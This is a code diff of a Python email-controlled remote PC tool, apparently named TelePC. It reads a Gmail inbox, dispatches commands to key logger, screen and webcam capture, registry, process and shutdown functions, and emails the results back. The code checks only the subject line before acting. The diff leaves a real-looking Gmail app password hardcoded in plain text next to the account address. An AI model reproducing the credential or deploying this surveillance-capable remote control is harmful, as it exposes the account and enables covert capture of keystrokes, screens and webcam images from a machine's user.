@@ -21,13 +21,19 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 from service.shared_function import *
 import datetime
+from dotenv import load_dotenv
+
+
+dotenv_path = Path('../.env')
+load_dotenv()  # take environment variables from .env.
 
 
 # Global variables
 global client
 BUFSIZ = 1024 * 4
 
-user = "telepcest@gmail.com"
+user = os.getenv("SERVER_EMAIL")
+# user = "telepcest@gmail.com"
 password = 'xthfegvikcjsqzvb'
 
 imap_url = 'imap.gmail.com'
@@ -58,7 +64,7 @@ def connect():
     return imap, smtp
 
 
-def send_mail(smtp, user, mail_message, content, msg:MIMEMultipart):
+def send_mail(smtp, user, mail_message, content, msg: MIMEMultipart):
     sender = mail_message['From']
     subject = mail_message['Subject']
     # Send a reply message to the sender
@@ -67,27 +73,26 @@ def send_mail(smtp, user, mail_message, content, msg:MIMEMultipart):
     reply_msg['From'] = user
     reply_msg['To'] = sender
     reply_msg['Subject'] = "Result of server TelePC"
-    
 
     reply_msg.attach(MIMEText('<div dir="ltr"><div>{content}</div><br><br><div><br></div><div>--<br><div dir="ltr" class="gmail_quote"><div class="gmail_quote"><div dir="ltr"><div><a href="mailto:{sender}?subject={subject}&body={content}"><strong>Reply</strong></a></div></div></div></div></div></div>'.format(
         sender=sender,
         subject=subject,
         content=content
     ), 'html'))
-    
-    reply_msg.attach(msg)
 
+    reply_msg.attach(msg)
 
     smtp.sendmail(user, sender, reply_msg.as_string())
     print('Reply sent to', sender)
 
 # receive and return mail
+
+
 def receive_mail(imap, smtp):
     while True:
         # refresh mail box
         imap.select('Inbox')
 
-        
         # search since last day
         date_since = (datetime.date.today() -
                       datetime.timedelta(days=1)).strftime("%d-%b-%Y")
@@ -112,7 +117,6 @@ def receive_mail(imap, smtp):
                 else:
                     content = mail_message.get_payload()
 
-
                 # Print the message details to the console
                 print('New message received from:', sender)
                 print('Subject:', subject)
@@ -123,28 +127,28 @@ def receive_mail(imap, smtp):
 
                 # do something here
                 if subject == "TelePCEST":
-                    #Format input
+                    # Format input
                     format_content = content.replace("\r\n", " ")
                     res = function(format_content)
 
-
                     # reply back to sender
                     send_mail(smtp, user, mail_message, content,  res)
-
-
 
         # Sleep for 10 second before checking for new emails again
         time.sleep(10)
 
 # Separate each line into main part and sub part
+
+
 def parse_msg(msg):
     options = []
     for line in filter(None, msg.strip().split('|')):
         options.append(line.strip().split(' - ', 1))
-    
+
     return options
 
-#dictionary action map
+
+# dictionary action map
 action_map = {
     "Key logger": kl.key_logger,
     "Capture screen": cs.capture_screen,
@@ -153,8 +157,9 @@ action_map = {
     "Directory tree": dt.directory_manage,
     "Shutdown/Logout": sl.shutdown_logout,
     "Application/Process": ap.application_process,
-    "Registry": rg.registry 
+    "Registry": rg.registry
 }
+
 
 def function(msg):
     options = parse_msg(msg)
@@ -163,56 +168,61 @@ def function(msg):
         result = None
         if (len(func) == 1):
             result = action_map[func[0]]()
-        else: 
+        else:
             result = action_map[func[0]](func[1])
-        
+
         if isinstance(result, str):
-        # plaintext result
+            # plaintext result
             if func[0] == "Directory tree":
-                attachment = MIMEApplication(result.encode('utf-8'), Name="directory_tree.txt", _subtype="txt")
-                attachment.add_header('Content-Disposition', 'attachment', filename="directory_tree.txt")
+                attachment = MIMEApplication(result.encode(
+                    'utf-8'), Name="directory_tree.txt", _subtype="txt")
+                attachment.add_header(
+                    'Content-Disposition', 'attachment', filename="directory_tree.txt")
                 res.attach(attachment)
-            
+
             # elif func[0] == "Key logger":
             #     attachment = MIMEApplication(result.encode('utf-8'), Name="key_logger.log", _subtype="log")
             #     attachment.add_header('Content-Disposition', 'attachment', filename="key_logger.log")
             #     res.attach(attachment)
-            
+
             elif func[0] == "Application/Process":
-                attachment = MIMEApplication(result.encode('utf-8'), Name="app_process.txt", _subtype="txt")
-                attachment.add_header('Content-Disposition', 'attachment', filename="app_process.txt")
+                attachment = MIMEApplication(result.encode(
+                    'utf-8'), Name="app_process.txt", _subtype="txt")
+                attachment.add_header(
+                    'Content-Disposition', 'attachment', filename="app_process.txt")
                 res.attach(attachment)
 
             else:
                 print(result)
-                res.attach(MIMEText(result.encode('utf-8'),'plain', 'utf-8'))
+                res.attach(MIMEText(result.encode('utf-8'), 'plain', 'utf-8'))
 
         elif isinstance(result, Image.Image):
-            #convert to binary and to MIMEImage
+            # convert to binary and to MIMEImage
             with BytesIO() as buffer:
                 result.save(buffer, format='PNG')
                 png_bytes = buffer.getvalue()
             result = MIMEImage(png_bytes, _subtype="png")
 
             if func[0] == "Capture screen":
-                #annouce to mail
+                # annouce to mail
                 text = "<p><b><u>++++CAPTURE SCREEN++++</u></b></p>" + "Picture has been capture"
-                res.attach(MIMEText(text.encode('utf-8'),'plain', 'utf-8'))
-                #attach picture
-                result.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
+                res.attach(MIMEText(text.encode('utf-8'), 'plain', 'utf-8'))
+                # attach picture
+                result.add_header('Content-Disposition',
+                                  'attachment', filename='screenshot.png')
                 res.attach(result)
 
-            
             elif func[0] == "Capture webcam":
-                #annouce to mail
+                # annouce to mail
                 text = "<p><b><u>++++CAPTURE WEBCAM++++</u></b></p>" + "Picture has been capture"
-                res.attach(MIMEText(text.encode('utf-8'),'plain', 'utf-8'))
-                #attach picture
-                result.add_header('Content-Disposition', 'attachment', filename='webcam_image.png')
+                res.attach(MIMEText(text.encode('utf-8'), 'plain', 'utf-8'))
+                # attach picture
+                result.add_header('Content-Disposition',
+                                  'attachment', filename='webcam_image.png')
                 res.attach(result)
-
 
     return res
+
 
 if __name__ == "__main__":
     create_asset_folder()
